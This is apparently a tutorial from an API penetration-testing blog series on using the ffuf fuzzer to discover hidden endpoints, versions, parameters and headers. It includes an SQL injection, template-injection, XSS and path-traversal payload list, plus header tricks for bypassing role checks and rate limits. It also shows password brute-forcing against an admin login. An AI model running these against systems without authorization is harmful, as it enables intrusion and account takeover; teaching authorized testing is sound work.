# API Fuzzing with ffuf: Find Hidden Endpoints in Minutes

> **Series:** 30-Day API Pentesting | **Day 16** | Week 3: Tools & Techniques  
> **Difficulty:** Beginner → Intermediate  
> **Tool:** ffuf (free, open source)

---

## What is ffuf and Why Should You Care?

**ffuf** (Fuzz Faster U Fool) is a web fuzzer written in Go. If you've used Burp Suite's Intruder for fuzzing, you already know the concept — but ffuf does it **100x faster** and is completely free.

The idea is simple: you give ffuf a URL with a placeholder word `FUZZ` in it, and a wordlist. ffuf then replaces `FUZZ` with every word in your list and sends each request to the server, telling you which ones got interesting responses.

```
Your command:   ffuf -u https://target.com/api/FUZZ -w endpoints.txt
What ffuf does: tries every word from endpoints.txt in place of FUZZ

→ https://target.com/api/users      → 200 OK   ✅ found!
→ https://target.com/api/admin      → 403       ✅ found (restricted, but exists)
→ https://target.com/api/export     → 200 OK   ✅ found!
→ https://target.com/api/blahblah   → 404       ❌ skip
```

### Why ffuf over Burp Intruder?

```
Burp Community Intruder: throttled to ~1 request/second
ffuf:                    1000+ requests/second

For a 10,000-word wordlist:
Burp Community: 10,000 seconds = 2.7 HOURS
ffuf:           ~10 seconds

That's the difference.
```

---

## Installation

```bash
# Method 1: Go install (if you have Go installed)
go install github.com/ffuf/ffuf/v2@latest

# Method 2: Download binary from GitHub (easiest)
# Go to: https://github.com/ffuf/ffuf/releases
# Download the binary for your OS (linux_amd64, darwin_amd64, windows_amd64)
# Extract → move to /usr/local/bin/ffuf

# Method 3: Kali Linux (already installed!)
ffuf -h    # just check if it works

# Verify installation
ffuf -V
# Should output: ffuf version: v2.x.x
```

---

## Understanding the FUZZ Keyword

The word `FUZZ` is ffuf's placeholder. You put it wherever you want ffuf to inject words from your wordlist. It can go anywhere:

```
In the URL path:        https://target.com/api/FUZZ
In a URL parameter:     https://target.com/api?id=FUZZ
In the URL filename:    https://target.com/FUZZ.json
In a POST body:         {"username": "FUZZ", "password": "test"}
In a header value:      Authorization: Bearer FUZZ
In a header name:       FUZZ: admin
Multiple positions:     https://target.com/FUZZ1/FUZZ2  (using W1, W2 with -w)
```

---

## Part 1: Basic API Endpoint Discovery

The most common use case. Find API endpoints that aren't documented anywhere.

### The Basic Command

```bash
ffuf -u https://target.com/api/FUZZ \
     -w /opt/SecLists/Discovery/Web-Content/api/objects.txt \
     -mc 200,201,301,401,403 \
     -fc 404
```

**Breaking down every flag:**

| Flag | What it does | Why you need it |
|------|-------------|-----------------|
| `-u` | The URL with FUZZ placeholder | Tells ffuf where to inject |
| `-w` | Path to your wordlist | The words to try |
| `-mc 200,201,301,401,403` | Only show these status codes | Remove irrelevant noise |
| `-fc 404` | Hide 404 responses | 404 = doesn't exist, skip it |

### Reading ffuf Output

```bash
ffuf -u https://api.target.com/FUZZ -w api.txt -mc 200,401,403

# Output looks like:
________________________________________________
 :: Method           : GET
 :: URL              : https://api.target.com/FUZZ
 :: Wordlist         : FUZZ: api.txt
________________________________________________

users                   [Status: 200, Size: 1234, Words: 45, Lines: 30]
admin                   [Status: 403, Size: 89,   Words: 5,  Lines: 3]
export                  [Status: 200, Size: 45678, Words: 890, Lines: 120]
swagger.json            [Status: 200, Size: 23456, Words: 567, Lines: 45]

# Explanation:
# "users"   → /api/users exists and returned 200 OK
# "admin"   → /api/admin exists but returned 403 (access denied — test auth bypass!)
# "export"  → /api/export exists — large response (45KB) → data dump endpoint?
# "swagger.json" → API documentation exposed! Check it for more endpoints
```

### Best Wordlists for API Discovery

```bash
# Install SecLists (if not already on Kali)
sudo apt install seclists
# Location: /usr/share/seclists/

# Best wordlists for APIs:
/usr/share/seclists/Discovery/Web-Content/api/objects.txt        # API objects
/usr/share/seclists/Discovery/Web-Content/api/actions.txt        # API actions
/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt   # General large
/usr/share/seclists/Discovery/Web-Content/big.txt                # General medium

# Create your own API wordlist (combine common patterns):
cat > ~/api-wordlist.txt << 'WORDS'
users
user
accounts
account
admin
administrator
orders
order
invoices
invoice
payments
payment
profile
profiles
config
configuration
settings
export
import
reports
report
logs
log
debug
test
internal
WORDS
```

---

## Part 2: API Version Enumeration

Find all live API versions. Old versions often have weaker security than the current one.

```bash
# Create versions wordlist
cat > ~/versions.txt << 'EOF'
v1
v2
v3
v4
v5
v6
beta
alpha
dev
staging
internal
latest
stable
2023
2024
1.0
1.1
2.0
EOF

# Fuzz the version part of the URL
ffuf -u https://target.com/api/FUZZ/users \
     -w ~/versions.txt \
     -mc 200,401,403 \
     -v

# What different status codes mean:
# 200 → version exists AND is accessible
# 401 → version exists but needs authentication
# 403 → version exists but access denied (your role can't access)
# 404 → version doesn't exist
```

### Comparing Version Behavior

```bash
# After finding live versions, compare their responses:
for version in v1 v2 v3 beta; do
    echo -n "Testing $version: "
    curl -s -o /dev/null -w "Status: %{http_code} | Size: %{size_download} bytes\n" \
        -H "Authorization: Bearer USER_TOKEN" \
        "https://target.com/api/$version/admin/users"
done

# Example output:
# Testing v1: Status: 200 | Size: 45231 bytes   ← BFLA! v1 not protected
# Testing v2: Status: 403 | Size: 89 bytes       ← protected
# Testing v3: Status: 403 | Size: 89 bytes       ← protected
# Testing beta: Status: 200 | Size: 45231 bytes  ← BFLA! beta not protected
```

---

## Part 3: Parameter Fuzzing

Discover hidden query parameters that change the API's behavior.

```bash
# Fuzz query parameter NAMES
# Example: /api/users?FUZZ=test — what parameters does this endpoint accept?
ffuf -u "https://target.com/api/users?FUZZ=test" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc 200 \
     -fs 1234    # filter out the default response size

# What you're looking for:
# /api/users?debug=test     → 200 (different from normal) → debug mode enabled!
# /api/users?admin=test     → 200 (different) → admin parameter exists!
# /api/users?export=true    → 200 (large file) → data export parameter!
# /api/users?role=admin     → 200 (more data) → role filter parameter!
```

```bash
# Fuzz parameter VALUES
# Example: after finding ?role= parameter, fuzz the value
ffuf -u "https://target.com/api/users?role=FUZZ" \
     -w ~/roles.txt \
     -mc 200

# roles.txt content:
# admin, superadmin, moderator, staff, internal, system, root, administrator
```

---

## Part 4: POST Body Fuzzing

Fuzz JSON body parameters — great for finding mass assignment vulnerabilities.

```bash
# Fuzz field NAMES in a JSON body
# Goal: find what extra fields the API accepts in POST requests
ffuf -u https://target.com/api/v1/users/register \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email":"test@test.com","password":"test","FUZZ":"value"}' \
     -w ~/field-names.txt \
     -mc 200,201 \
     -mr "success|created|user"    # match response containing these words

# field-names.txt:
# role, is_admin, admin, verified, email_verified, credits, balance,
# plan, subscription, tier, account_type, permissions, scope

# If "role" gives a 201 response with {"role":"value"} in the response →
# mass assignment vulnerability found!
```

```bash
# Fuzz JSON body for injection
# Test every string field for SQLi/SSTI/XSS
ffuf -u https://target.com/api/v1/search \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer TOKEN" \
     -d '{"query":"FUZZ"}' \
     -w ~/injection-payloads.txt \
     -mr "error|exception|syntax|ORA-|mysql|sqlite" \
     -o injection_results.json

# injection-payloads.txt:
# '
# "
# ' OR 1=1--
# '; DROP TABLE users;--
# {{7*7}}
# ${7*7}
# <script>alert(1)</script>
# ../../../../etc/passwd
```

---

## Part 5: Header Fuzzing

Some APIs use custom headers for access control, internal routing, or debug features.

```bash
# Fuzz header values — try to access admin with a custom role header
ffuf -u https://target.com/api/admin/users \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "X-Role: FUZZ" \
     -w ~/roles.txt \
     -mc 200 \
     -v

# roles.txt:
# admin, superadmin, system, internal, staff, moderator, root, administrator

# If X-Role: admin gives 200 → server trusts client-supplied role header!
```

```bash
# Fuzz IP bypass headers for rate limit bypass
ffuf -u https://target.com/api/auth/login \
     -X POST \
     -H "Content-Type: application/json" \
     -H "X-Forwarded-For: FUZZ" \
     -d '{"email":"admin@target.com","password":"wrongpass"}' \
     -w ~/ips.txt \
     -mc 200

# ips.txt: 1.2.3.1, 1.2.3.2, ... 1.2.3.255
# If each IP gets its own rate limit bucket → you can brute force endlessly
```

```bash
# Fuzz custom header NAMES — find undocumented headers
ffuf -u https://target.com/api/users \
     -H "Authorization: Bearer TOKEN" \
     -H "FUZZ: admin" \
     -w /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers.txt \
     -mr "admin|internal|debug"
```

---

## Part 6: Filtering — Dealing with Noise

Large wordlists generate a lot of output. Filters help you find real findings fast.

### The Filter Problem

```bash
# Without filters — too much noise:
ffuf -u https://target.com/api/FUZZ -w big.txt
# Output: 10,000 lines, mostly 404s you don't care about
```

### Smart Filtering Strategies

```bash
# Strategy 1: Filter by status code (most common)
-fc 404          # filter out 404s (doesn't exist)
-fc 404,400,500  # filter multiple codes
-mc 200,201,403  # ONLY show these codes

# Strategy 2: Filter by response size (removes identical error pages)
# First, run without filters to find the default 404 size:
ffuf -u https://target.com/api/FUZZ -w small-test.txt | head -5
# If all 404s show "Size: 1234" → filter that exact size:
-fs 1234

# Strategy 3: Filter by word count
-fw 12     # filter responses with exactly 12 words (same error message)

# Strategy 4: Filter by line count
-fl 5      # filter responses with exactly 5 lines

# Strategy 5: Match by regex (find specific content in response)
-mr "success|token|password|admin"   # match responses containing these strings
-fr "Not Found|page not found"       # filter responses containing these strings
```

### Full Command with Smart Filters

```bash
# This is a complete, production-ready ffuf command:
ffuf \
    -u "https://api.target.com/api/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -mc 200,201,301,302,401,403 \
    -fc 404,405,500 \
    -fs 0,23 \
    -t 50 \
    -rate 100 \
    -timeout 10 \
    -o output.json \
    -of json \
    -v

# Flag explanations:
# -t 50         → 50 concurrent threads
# -rate 100     → max 100 requests/second (don't hammer too hard)
# -timeout 10   → 10 second timeout per request
# -o output.json → save results to file
# -of json      → output format (also: csv, ejson, html, md, table)
# -v            → verbose mode (shows full URL in output)
```

---

## Part 7: Output and Saving Results

```bash
# Save results to a file for your report
ffuf -u https://target.com/api/FUZZ -w api.txt -mc 200 \
     -o results.json -of json

# Parse the JSON output with Python:
python3 << 'EOF'
import json

with open('results.json') as f:
    data = json.load(f)

for result in data['results']:
    print(f"Status: {result['status']} | URL: {result['url']} | Size: {result['length']}")
EOF

# Save as markdown table:
ffuf ... -o results.md -of md

# Print only URLs (great for piping to other tools):
ffuf ... | grep -oP 'https://[^\s]+' | sort -u
```

---

## Part 8: Real Attack Scenarios

### Scenario 1: Full API Recon Run

```bash
TARGET="https://api.target.com"
TOKEN="Bearer eyJhbGc..."

echo "[1] Discovering API endpoints..."
ffuf -u "$TARGET/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
     -H "Authorization: $TOKEN" \
     -mc 200,401,403 -fc 404 -t 50 \
     -o step1_endpoints.json -of json -s

echo "[2] Checking API versions..."
ffuf -u "$TARGET/api/FUZZ/users" \
     -w ~/versions.txt \
     -H "Authorization: $TOKEN" \
     -mc 200,401,403 -t 20 \
     -o step2_versions.json -of json -s

echo "[3] Checking for swagger/docs..."
ffuf -u "$TARGET/FUZZ" \
     -w ~/swagger-paths.txt \
     -mc 200 -t 20 -s

echo "[4] Fuzzing admin paths..."
ffuf -u "$TARGET/api/v1/FUZZ" \
     -w ~/admin-paths.txt \
     -H "Authorization: $TOKEN" \
     -mc 200,403 -fc 404 -t 30 -s

echo "Done! Check output files."
```

### Scenario 2: Parameter Discovery for Mass Assignment

```bash
# You found: POST /api/v1/profile
# You want to know what fields it accepts

ffuf -u https://target.com/api/v1/profile \
     -X POST \
     -H "Authorization: Bearer YOUR_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"test","FUZZ":"admin"}' \
     -w ~/field-names.txt \
     -mc 200,201 \
     -fr "invalid|unknown|not allowed" \
     -mr "success|updated|saved"

# Any field that gives a success response WITHOUT an error
# is an accepted field → test for privilege escalation
```

### Scenario 3: Rate Limit Testing

```bash
# Test if /api/login has rate limiting
ffuf -u https://target.com/api/v1/auth/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email":"admin@target.com","password":"FUZZ"}' \
     -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
     -mc 200,429 \
     -rate 10 \
     -t 5

# If you see 429 responses → rate limiting is working
# If you NEVER see 429 after 1000 requests → rate limit MISSING = bug!
```

---

## Checklist

```
☐  Install ffuf and verify it works: ffuf -V
☐  Download SecLists: /usr/share/seclists/ on Kali
☐  Fuzz all API paths: ffuf -u target/api/FUZZ -w api.txt -mc 200,401,403
☐  Version enumeration: ffuf -u target/api/FUZZ/users -w versions.txt
☐  Fuzz query params: ffuf -u target/api?FUZZ=test -w params.txt
☐  POST body fuzzing: ffuf -X POST -d '{"FUZZ":"val"}' -w fields.txt
☐  Header fuzzing: ffuf -H 'X-Role: FUZZ' -w roles.txt -mc 200
☐  Smart filters: -fc 404 -fs COMMON_SIZE to eliminate noise
☐  Save output: -o results.json -of json for documentation
☐  Rate limit test: 100+ requests to /login → check if 429 appears
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 16 of 30*
